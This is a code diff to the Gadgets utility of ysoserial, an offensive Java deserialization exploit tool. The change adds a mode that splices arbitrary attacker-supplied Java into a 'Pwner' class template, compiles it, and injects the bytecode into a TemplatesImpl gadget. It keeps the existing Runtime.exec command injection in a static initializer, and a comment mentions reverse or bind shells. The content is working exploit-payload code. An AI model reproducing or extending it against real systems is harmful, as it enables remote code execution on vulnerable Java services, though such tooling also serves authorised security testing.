@@ -3,12 +3,17 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,6 +29,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.commons.io.IOUtils;
+import top.inhann.Test;
 
 
 /*
@@ -117,21 +124,26 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd;
+        byte[] classBytes;
+
         if(command.startsWith("CODE;")){
-            cmd = command.substring(5);
+            String code = command.substring(5);
+            InputStream inputStream = Test.class.getClassLoader().getResourceAsStream("Pwner.java");
+            byte[] java = IOUtils.toByteArray(inputStream);
+            String javacode = new String(java);
+            javacode = javacode.replace("System.out.println(9999);",command.substring(5));
+            classBytes = JavaCompiler.compile("Pwner",javacode);
         }else{
-            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                 command.replace("\\", "\\\\").replace("\"", "\\\"") +
                 "\");";
+            clazz.makeClassInitializer().insertAfter(cmd);
+            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+            clazz.setName("ysoserial.Pwner" + System.nanoTime());
+            CtClass superC = pool.get(abstTranslet.getName());
+            clazz.setSuperclass(superC);
+            classBytes = clazz.toBytecode();
         }
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
-
-        final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
